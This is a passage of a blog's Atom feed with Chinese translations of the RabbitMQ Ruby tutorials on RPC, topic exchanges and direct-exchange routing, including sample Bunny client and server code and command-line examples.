class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FibonacciServer</span></span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span></span></span><br><span class="line">    @connection = Bunny.new</span><br><span class="line">    @connection.start</span><br><span class="line">    @channel = @connection.create_channel</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(queue_name)</span></span></span><br><span class="line">    @queue = channel.queue(queue_name)</span><br><span class="line">    @exchange = channel.default_exchange</span><br><span class="line">    subscribe_to_queue</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">stop</span></span></span><br><span class="line">    channel.close</span><br><span class="line">    connection.close</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  private</span><br><span class="line"></span><br><span class="line">  <span class="keyword">attr_reader</span> <span class="symbol">:channel</span>, <span class="symbol">:exchange</span>, <span class="symbol">:queue</span>, <span class="symbol">:connection</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">subscribe_to_queue</span></span></span><br><span class="line">    queue.subscribe(<span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|_delivery_info, properties, payload|</span></span><br><span class="line">      result = fibonacci(payload.to_i)</span><br><span class="line"></span><br><span class="line">      exchange.publish(</span><br><span class="line">        result.to_s,</span><br><span class="line">        <span class="symbol">routing_key:</span> properties.reply_to,</span><br><span class="line">        <span class="symbol">correlation_id:</span> properties.correlation_id</span><br><span class="line">      )</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(value)</span></span></span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">if</span> value.zero? <span class="params">||</span> value == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    fibonacci(value - <span class="number">1</span>) + fibonacci(value - <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">  server = FibonacciServer.new</span><br><span class="line"></span><br><span class="line">  puts <span class="string">' [x] Awaiting RPC requests'</span></span><br><span class="line">  server.start(<span class="string">'rpc_queue'</span>)</span><br><span class="line"><span class="keyword">rescue</span> Interrupt =&gt; <span class="number">_</span></span><br><span class="line">  server.stop</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>服务器端代码相当简单：</p><ul><li>像往常一样，我们建立连接、通道，并声明队列。</li><li>或许我们希望能在服务器上多开几个线程。为了能将负载平均地分摊到多个服务器，我们需要将通道上的<code>prefetch</code>设置好。</li><li>我们使用<code>Bunny::Queue#subscribe</code>来从队列里接收消息。我们等待请求消息，处理消息，返回响应，然后无线循环以上三步。</li></ul><p><a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/rpc_client.rb" target="_blank" rel="noopener">rpc_client.rb</a>代码:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'thread'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FibonacciClient</span></span></span><br><span class="line">  <span class="keyword">attr_accessor</span> <span class="symbol">:call_id</span>, <span class="symbol">:response</span>, <span class="symbol">:lock</span>, <span class="symbol">:condition</span>, <span class="symbol">:connection</span>,</span><br><span class="line">                <span class="symbol">:channel</span>, <span class="symbol">:server_queue_name</span>, <span class="symbol">:reply_queue</span>, <span class="symbol">:exchange</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(server_queue_name)</span></span></span><br><span class="line">    @connection = Bunny.new(<span class="symbol">automatically_recover:</span> <span class="literal">false</span>)</span><br><span class="line">    @connection.start</span><br><span class="line"></span><br><span class="line">    @channel = connection.create_channel</span><br><span class="line">    @exchange = channel.default_exchange</span><br><span class="line">    @server_queue_name = server_queue_name</span><br><span class="line"></span><br><span class="line">    setup_reply_queue</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(n)</span></span></span><br><span class="line">    @call_id = generate_uuid</span><br><span class="line"></span><br><span class="line">    exchange.publish(n.to_s,</span><br><span class="line">                     <span class="symbol">routing_key:</span> server_queue_name,</span><br><span class="line">                     <span class="symbol">correlation_id:</span> call_id,</span><br><span class="line">                     <span class="symbol">reply_to:</span> reply_queue.name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wait for the signal to continue the execution</span></span><br><span class="line">    lock.synchronize &#123; condition.wait(lock) &#125;</span><br><span class="line"></span><br><span class="line">    response</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">stop</span></span></span><br><span class="line">    channel.close</span><br><span class="line">    connection.close</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  private</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">setup_reply_queue</span></span></span><br><span class="line">    @lock = Mutex.new</span><br><span class="line">    @condition = ConditionVariable.new</span><br><span class="line">    that = <span class="keyword">self</span></span><br><span class="line">    @reply_queue = channel.queue(<span class="string">''</span>, <span class="symbol">exclusive:</span> <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">    reply_queue.subscribe <span class="keyword">do</span> <span class="params">|_delivery_info, properties, payload|</span></span><br><span class="line">      <span class="keyword">if</span> properties[<span class="symbol">:correlation_id</span>] == that.call_id</span><br><span class="line">        that.response = payload.to_i</span><br><span class="line"></span><br><span class="line">        <span class="comment"># sends the signal to continue the execution of #call</span></span><br><span class="line">        that.lock.synchronize &#123; that.condition.signal &#125;</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">generate_uuid</span></span></span><br><span class="line">    <span class="comment"># very naive but good enough for code examples</span></span><br><span class="line">    <span class="string">"<span class="subst">#&#123;rand&#125;</span><span class="subst">#&#123;rand&#125;</span><span class="subst">#&#123;rand&#125;</span>"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">client = FibonacciClient.new(<span class="string">'rpc_queue'</span>)</span><br><span class="line"></span><br><span class="line">puts <span class="string">' [x] Requesting fib(30)'</span></span><br><span class="line">response = client.call(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">puts <span class="string">" [.] Got <span class="subst">#&#123;response&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">client.stop</span><br></pre></td></tr></table></figure></p><p>现在是时候来看一下我们的完整样例代码了：<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/rpc_client.rb" target="_blank" rel="noopener">rpc_client.rb</a>和<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/rpc_server.rb" target="_blank" rel="noopener">rpc_server.rb</a>。（尽管它们只有一下基本的异常处理）</p><p>我们的RPC服务已经准备就绪了，现在启动服务器端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby rpc_server.rb</span><br><span class="line"><span class="comment"># =&gt; [x] Awaiting RPC requests</span></span><br></pre></td></tr></table></figure></p><p>运行客户端，请求一个fibonacci数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby rpc_client.rb</span><br><span class="line"><span class="comment"># =&gt; [x] Requesting fib(30)</span></span><br></pre></td></tr></table></figure><p>此处呈现的设计并不是实现RPC服务的唯一方式，但是他有一些重要的优势：</p><ul><li>如果RPC服务器运行的过慢的时候，你可以通过运行另外一个服务器端轻松扩展它。试试在控制台中运行第二个 <code>rpc_server.rb</code>。</li><li>在客户端，RPC请求只发送或接收一条消息。不需要像<code>Bunny::Channel#queue</code>这样的异步调用。所以RPC客户端的单个请求只需要一个网络往返。</li></ul><p>我们的代码依旧非常简单，而且没有试图去解决一些复杂（但是重要）的问题，如：</p><ul><li>当没有服务器运行时，客户端如何作出反映。</li><li>客户端是否需要实现类似RPC超时的东西。</li><li>如果服务器发生故障，并且抛出异常，应该被转发到客户端吗？</li><li>在处理前，防止混入无效的信息（例如检查边界）。</li></ul><blockquote><p>如果你想做一些实验，你会发现<a href="https://www.rabbitmq.com/management.html" target="_blank" rel="noopener">管理页面</a>在观测队列方面是很有用处的。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;远程过程调用&quot;&gt;&lt;a href=&quot;#远程过程调用&quot; class=&quot;headerlink&quot; title=&quot;远程过程调用&quot;&gt;&lt;/a&gt;远程过程调用&lt;/h1&gt;&lt;p&gt;（使用Ruby客户端）&lt;/p&gt;
&lt;p&gt;在第二篇教程中我们介绍了如何使用工作队列（work queue）在多个工作者（woker）中间分发耗时的任务。&lt;/p&gt;
&lt;p&gt;可是如果我们需要将一个函数运行在远程计算机上并且等待从那儿获取结果时，该怎么办呢？这就是另外的故事了。这种模式通常被称为远程过程调用（Remote Procedure Call）或者RPC。&lt;/p&gt;
&lt;p&gt;这篇教程中，我们会使用RabbitMQ来构建一个RPC系统：包含一个客户端和一个RPC服务器。现在的情况是，我们没有一个值得被分发的足够耗时的任务，所以接下来，我们会创建一个模拟RPC服务来返回斐波那契数列。&lt;/p&gt;
    
    </summary>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/categories/Ruby/"/>
    
    
      <category term="RabbitMQ" scheme="http://jack0pan.github.io/tags/RabbitMQ/"/>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/tags/Ruby/"/>
    
      <category term="翻译" scheme="http://jack0pan.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>RabbitMQ教程（五）──主题</title>
    <link href="http://jack0pan.github.io/2017/10/05/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%94%EF%BC%89%E2%94%80%E2%94%80%E4%B8%BB%E9%A2%98/"/>
    <id>http://jack0pan.github.io/2017/10/05/RabbitMQ教程（五）──主题/</id>
    <published>2017-10-05T14:11:30.000Z</published>
    <updated>2018-04-13T15:15:09.069Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RabbitMQ教程（五）──主题"><a href="#RabbitMQ教程（五）──主题" class="headerlink" title="RabbitMQ教程（五）──主题"></a>RabbitMQ教程（五）──主题</h1><p>（使用Bunny）</p><p>上一篇教程里，我们改进了我们的日志系统。我们使用直连交换机替代了扇型交换机，从只能盲目的广播消息改进为有可能选择性的接收日志。</p><p>尽管直连交换机能够改善我们的系统，但是它也有它的限制 ——<br>没办法基于多个标准执行路由操作。</p><p>在我们的日志系统中，我们不只希望订阅基于严重程度的日志，同时还希望订阅基于发送来源的日志。Unix工具<a href="http://en.wikipedia.org/wiki/Syslog" target="_blank" rel="noopener">syslog</a>就是同时基于严重程度-severity<br>(info/warn/crit…) 和 设备-facility (auth/cron/kern…)来路由日志的。</p><p>如果这样的话，将会给予我们非常大的灵活性，我们既可以监听来源于“cron”的严重程度为“critical<br>errors”的日志，也可以监听来源于“kern”的所有日志。</p><p>为了实现这个目的，接下来我们学习如何使用另一种更复杂的交换机 —— 主题交换机。</p><h2 id="主题交换机"><a href="#主题交换机" class="headerlink" title="主题交换机"></a>主题交换机</h2><p>发送到主题交换机（topic<br>exchange）的消息不可以携带随意什么样子的路由键（routing_key），它的路由键必须是一个由.分隔开的词语列表。这些单词随便是什么都可以，但是最好是跟携带它们的消息有关系的词汇。以下是几个推荐的例子：”stock.usd.nyse”,<br>“nyse.vmw”, “quick.orange.rabbit”。词语的个数可以随意，但是不要超过255字节。</p><p>绑定键也必须拥有同样的格式。主题交换机背后的逻辑跟直连交换机很相似 ——<br>一个携带着特定路由键的消息会被主题交换机投递给绑定键与之想匹配的队列。但是它的绑定键和路由键有两个特殊应用方式：</p><ul><li><code>*</code> (星号) 用来表示一个单词.</li><li><code>#</code> (井号) 用来表示任意数量（零个或多个）单词。</li></ul><p>下边用图说明：</p><p><img src="https://www.rabbitmq.com/img/tutorials/python-five.png" alt="python-five"></p><p>这个例子里，我们发送的所有消息都是用来描述小动物的。发送的消息所携带的路由键是由三个单词所组成的，这三个单词被两个.分割开。路由键里的第一个单词描述的是动物的手脚的利索程度，第二个单词是动物的颜色，第三个是动物的种类。所以它看起来是这样的：“<speed>.<colour>.<species>”。</species></colour></speed></p><p>我们创建了三个绑定：Q1的绑定键为“<em>.orange.</em>”，Q2的绑定键为<br>“<em>.</em>.rabbit”和“lazy.#”。</p><p>这三个绑定键被可以总结为：</p><ul><li>Q1 对所有的桔黄色动物都感兴趣。</li><li>Q2 则是对所有的兔子和所有懒惰的动物感兴趣。</li></ul><p>一个携带有“quick.orange.rabbit”的消息将会被分别投递给这两个队列。携带着“lazy.orange.elephant”的消息同样也会给两个队列都投递过去。另一方面携带有“quick.orange.fox”的消息会投递给第一个队列，携带有“lazy.brown.fox”的消息会投递给第二个队列。携带有“lazy.pink.rabbit”的消息只会被投递给第二个队列一次，即使它同时匹配第二个队列的两个绑定。携带着“quick.brown.fox”的消息不会投递给任何一个队列。</p><p>如果我们违反约定，发送了一个携带有一个单词或者四个单词（”orange” or<br>“quick.orange.male.rabbit”）的消息时，发送的消息不会投递给任何一个队列，而且会丢失掉。</p><p>但是另一方面，即使 “lazy.orange.male.rabbit”<br>有四个单词，他还是会匹配最后一个绑定，并且被投递到第二个队列中。</p><blockquote><p><strong>主题交换机</strong></p><p>主题交换机是很强大的，它可以表现出跟其他交换机类似的行为</p><p>当一个队列的绑定键为<code>#</code>（井号）<br>的时候，这个队列将会无视消息的路由键，接收所有的消息。</p><p>当 <code>*</code> (星号) 和 <code>#</code> (井号)<br>这两个特殊字符都未在绑定键中出现的时候，此时主题交换机就拥有的直连交换机的行为。</p></blockquote><h2 id="组合在一起"><a href="#组合在一起" class="headerlink" title="组合在一起"></a>组合在一起</h2><p>接下来我们会将主题交换机应用到我们的日志系统中。在开始工作前，我们假设日志的路由键由两个单词组成，路由键看起来是这样的：“<facility>.<severity>”</severity></facility></p><p>代码跟上一篇教程差不多。</p><p><code>emit_log_topic.rb</code>的代码：<br><code></code>ruby</p><p>#!/usr/bin/env ruby<br>require ‘bunny’</p><p>connection = Bunny.new<br>connection.start</p><p>channel = connection.create_channel<br>exchange = channel.topic(‘topic_logs’)<br>severity = ARGV.shift || ‘anonymous.info’<br>message = ARGV.empty? ? ‘Hello World!’ : ARGV.join(‘ ‘)</p><p>exchange.publish(message, routing_key: severity)<br>puts “ [x] Sent #{severity}:#{message}”</p><p>connection.close<br><code></code></p><p><code>receive_logs_topic.rb</code>的代码：<br><code></code>ruby</p><p>#!/usr/bin/env ruby<br>require ‘bunny’</p><p>abort “Usage: #{$PROGRAM_NAME} [binding key]” if ARGV.empty?</p><p>connection = Bunny.new<br>connection.start</p><p>channel = connection.create_channel<br>exchange = channel.topic(‘topic_logs’)<br>queue = channel.queue(‘’, exclusive: true)</p><p>ARGV.each do |severity|<br>  queue.bind(exchange, routing_key: severity)<br>end</p><p>puts ‘ [*] Waiting for logs. To exit press CTRL+C’</p><p>begin<br>  queue.subscribe(block: true) do |delivery_info, _properties, body|<br>    puts “ [x] #{delivery_info.routing_key}:#{body}”<br>  end<br>rescue Interrupt =&gt; _<br>  channel.close<br>  connection.close</p><p>  exit(0)<br>end<br><code></code></p><p>执行下边命令 接收所有日志：<br><code>bashruby receive_logs_topic.rb &quot;#&quot;</code></p><p>执行下边命令 接收来自”kern“设备的日志：<br><code>bashruby receive_logs_topic.rb &quot;kern.*&quot;</code></p><p>执行下边命令 只接收严重程度为”critical“的日志：<br><code>bashruby receive_logs_topic.rb &quot;*.critical&quot;</code></p><p>执行下边命令 建立多个绑定：<br><code>bashruby receive_logs_topic.rb &quot;kern.*&quot; &quot;*.critical&quot;</code></p><p>执行下边命令 发送路由键为 “kern.critical” 的日志：<br><code>bashruby emit_log_topic.rb &quot;kern.critical&quot; &quot;A critical kernel error&quot;</code></p><p>执行上边命令试试看效果吧。另外，上边代码不会对路由键和绑定键做任何假设，所以你可以在命令中使用超过两个路由键参数。</p><p>（完整代码参见<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/emit_log_topic.rb" target="_blank" rel="noopener">emit_logs_topic.rb</a><br>和<br><a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/receive_logs_topic.rb" target="_blank" rel="noopener">receive_logs_topic.rb</a>)</p><p>移步至教程六学习RPC。`</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RabbitMQ教程（五）──主题&quot;&gt;&lt;a href=&quot;#RabbitMQ教程（五）──主题&quot; class=&quot;headerlink&quot; title=&quot;RabbitMQ教程（五）──主题&quot;&gt;&lt;/a&gt;RabbitMQ教程（五）──主题&lt;/h1&gt;&lt;p&gt;（使用Bunny）&lt;
      
    
    </summary>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/categories/Ruby/"/>
    
    
      <category term="RabbitMQ" scheme="http://jack0pan.github.io/tags/RabbitMQ/"/>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/tags/Ruby/"/>
    
      <category term="翻译" scheme="http://jack0pan.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>RabbitMQ教程（四）──路由</title>
    <link href="http://jack0pan.github.io/2017/10/04/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89%E2%94%80%E2%94%80%E8%B7%AF%E7%94%B1/"/>
    <id>http://jack0pan.github.io/2017/10/04/RabbitMQ教程（四）──路由/</id>
    <published>2017-10-04T14:12:11.000Z</published>
    <updated>2018-04-13T15:16:22.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="RabbitMQ教程（四）──路由"><a href="#RabbitMQ教程（四）──路由" class="headerlink" title="RabbitMQ教程（四）──路由"></a>RabbitMQ教程（四）──路由</h1><p>（使用Bunny）</p><p>在前面的教程中，我们实现了一个简单的日志系统。可以把日志消息广播给多个接收者。</p><p>本篇教程中我们打算新增一个功能 ——<br>使得它能够只订阅消息的一个字集。例如，我们只需要把严重的错误日志信息写入日志文件（存储到磁盘），但同时仍然把所有的日志信息输出到控制台中。</p><h2 id="绑定（Bindings）"><a href="#绑定（Bindings）" class="headerlink" title="绑定（Bindings）"></a>绑定（Bindings）</h2><p>前面的例子，我们已经创建过绑定（bindings），代码如下：<br><code>rubyqueue.bind(exchange_name)</code></p><p>绑定（binding）是指交换机（exchange）和队列（queue）的关系。可以简单理解为：这个队列（queue）对这个交换机（exchange）的消息感兴趣。</p><p>绑定的时候可以带上一个额外的<code>:routing_key</code>参数。为了避免与<code>Bunny::Exchange#publish</code>的参数混淆，我们把它叫做绑定键（binding<br>key）。以下是如何创建一个带绑定键的绑定：<br><code>rubyqueue.bind(exchange_name, routing_key: &#39;black&#39;)</code></p><p>绑定键的意义取决于交换机（exchange）的类型。我们之前使用过的扇型交换机（fanout<br>exchanges）会忽略这个值。</p><h2 id="直连交换机（Direct-exchange）"><a href="#直连交换机（Direct-exchange）" class="headerlink" title="直连交换机（Direct exchange）"></a>直连交换机（Direct exchange）</h2><p>我们的日志系统广播所有的消息给所有的消费者（consumers）。我们打算扩展它，使其基于日志的严重程度进行消息过滤。例如我们也许只是希望将比较严重的错误（error）日志写入磁盘，以免在警告（warning）或者信息（info）日志上浪费磁盘空间。</p><p>我们使用的扇型交换机（fanout exchange）没有足够的灵活性 —— 它能做的仅仅是广播。</p><p>我们将会使用直连交换机（direct exchange）来代替。路由的算法很简单 ——<br>交换机将会对绑定键（binding key）和路由键（routing<br>key）进行精确匹配，从而确定消息该分发到哪个队列。</p><p>下图能够很好的描述这个场景：</p><p><img src="https://www.rabbitmq.com/img/tutorials/direct-exchange.png" alt="direct-exchange"></p><p>在这个场景中，我们可以看到直连交换机<br>X和两个队列进行了绑定。第一个队列使用orange作为绑定键，第二个队列有两个绑定，一个使用black作为绑定键，另外一个使用green。</p><p>这样以来，当路由键为orange的消息发布到交换机，就会被路由到队列Q1。路由键为black或者green的消息就会路由到Q2。其他的所有消息都将会被丢弃。</p><h2 id="多个绑定（Multiple-bindings）"><a href="#多个绑定（Multiple-bindings）" class="headerlink" title="多个绑定（Multiple bindings）"></a>多个绑定（Multiple bindings）</h2><p><img src="https://www.rabbitmq.com/img/tutorials/direct-exchange-multiple.png" alt="direct-exchange-multiple"></p><p>多个队列使用相同的绑定键是合法的。这个例子中，我们可以添加一个X和Q1之间的绑定，使用black绑定键。这样一来，直连交换机就和扇型交换机的行为一样，会将消息广播到所有匹配的队列。带有black路由键的消息会同时发送到Q1和Q2。</p><h2 id="发送日志"><a href="#发送日志" class="headerlink" title="发送日志"></a>发送日志</h2><p>我们将会发送消息到一个直连交换机，把日志级别作为路由键。这样接收日志的脚本就可以根据严重级别来选择它想要处理的日志。我们先看看发送日志。</p><p>我们需要创建一个交换机（exchange）：<br><code>rubychannel.direct(&#39;logs&#39;)</code></p><p>然后我们发送一则消息：<br><code>rubyexchange = channel.direct(&#39;logs&#39;)exchange.publish(message, routing_key: severity)</code></p><p>我们先假设“severity”的值是info、warning、error中的一个。</p><h2 id="订阅"><a href="#订阅" class="headerlink" title="订阅"></a>订阅</h2><p>处理接收消息的方式和之前差不多，只有一个例外，我们将会为我们感兴趣的每个严重级别分别创建一个新的绑定。<br><code></code>ruby<br>queue = channel.queue(‘’)</p><p>ARGV.each do |severity|<br>  queue.bind(‘logs’, routing_key: severity)<br>end<br><code></code></p><h2 id="代码整合"><a href="#代码整合" class="headerlink" title="代码整合"></a>代码整合</h2><p><img src="https://www.rabbitmq.com/img/tutorials/python-four.png" alt="python-four"></p><p><code>emit_log_direct.rb</code>的代码：<br><code></code>ruby</p><p>#!/usr/bin/env ruby<br>require ‘bunny’</p><p>connection = Bunny.new<br>connection.start</p><p>channel = connection.create_channel<br>exchange = channel.direct(‘direct_logs’)<br>severity = ARGV.shift || ‘info’<br>message = ARGV.empty? ? ‘Hello World!’ : ARGV.join(‘ ‘)</p><p>exchange.publish(message, routing_key: severity)<br>puts “ [x] Sent ‘#{message}’”</p><p>connection.close<br><code></code></p><p><code>receive_logs_direct.rb</code>的代码：<br><code></code>ruby</p><p>#!/usr/bin/env ruby<br>require ‘bunny’</p><p>abort “Usage: #{$PROGRAM_NAME} [info] [warning] [error]” if ARGV.empty?</p><p>connection = Bunny.new<br>connection.start</p><p>channel = connection.create_channel<br>exchange = channel.direct(‘direct_logs’)<br>queue = channel.queue(‘’, exclusive: true)</p><p>ARGV.each do |severity|<br>  queue.bind(exchange, routing_key: severity)<br>end</p><p>puts ‘ [*] Waiting for logs. To exit press CTRL+C’</p><p>begin<br>  queue.subscribe(block: true) do |delivery_info, _properties, body|<br>    puts “ [x] #{delivery_info.routing_key}:#{body}”<br>  end<br>rescue Interrupt =&gt; _<br>  channel.close<br>  connection.close</p><p>  exit(0)<br>end<br><code></code></p><p>如果你希望只是保存warning和error级别的日志到磁盘，只需要打开控制台并输入：<br><code>bashruby receive_logs_direct.rb warning error &gt; logs_from_rabbit.log</code></p><p>如果你希望所有的日志信息都输出到屏幕中，打开一个新的终端，然后输入：<br><code></code>bash<br>ruby receive_logs_direct.rb info warning error</p><h1 id="gt-Waiting-for-logs-To-exit-press-CTRL-C"><a href="#gt-Waiting-for-logs-To-exit-press-CTRL-C" class="headerlink" title="=&gt; [*] Waiting for logs. To exit press CTRL+C"></a>=&gt; [*] Waiting for logs. To exit press CTRL+C</h1><p><code></code></p><p>如果要触发一个error级别的日志，只需要输入：<br><code></code>bash<br>ruby emit_log_direct.rb error “Run. Run. Or it will explode.”</p><h1 id="gt-x-Sent-‘error’-’Run-Run-Or-it-will-explode-’"><a href="#gt-x-Sent-‘error’-’Run-Run-Or-it-will-explode-’" class="headerlink" title="=&gt; [x] Sent ‘error’:’Run. Run. Or it will explode.’"></a>=&gt; [x] Sent ‘error’:’Run. Run. Or it will explode.’</h1><p><code></code></p><p>这里是完整的代码：(<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/emit_log_direct.rb" target="_blank" rel="noopener">emit_log_direct.rb</a>和<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/receive_logs_direct.rb" target="_blank" rel="noopener">receive_logs_direct.rb</a>)</p><p>下一篇教程告诉我们如何基于模式来监听消息。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;RabbitMQ教程（四）──路由&quot;&gt;&lt;a href=&quot;#RabbitMQ教程（四）──路由&quot; class=&quot;headerlink&quot; title=&quot;RabbitMQ教程（四）──路由&quot;&gt;&lt;/a&gt;RabbitMQ教程（四）──路由&lt;/h1&gt;&lt;p&gt;（使用Bunny）&lt;
      
    
    </summary>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/categories/Ruby/"/>
    
    
      <category term="RabbitMQ" scheme="http://jack0pan.github.io/tags/RabbitMQ/"/>
    
      <category term="Ruby" scheme="http://jack0pan.github.io/tags/Ruby/"/>
    
      <category term="翻译" scheme="http://jack0pan.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>RabbitMQ教程（三）──发布、订阅</title>
    <link href="http://jack0pan.github.io/2017/10/03/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%E2%94%80%E2%94%80%E5%8F%91%E5%B8%83%E3%80%81%E8%AE%A2%E9%98%85/"/>
    <id>http://jack0pan.github.io/2017/10/03/RabbitMQ教程（三）──发布、订阅/</id>
    <published>2017-10-03T14:12:11.000Z</published>
    <updated>2018-04-13T15:17:38.829Z</updated>
    
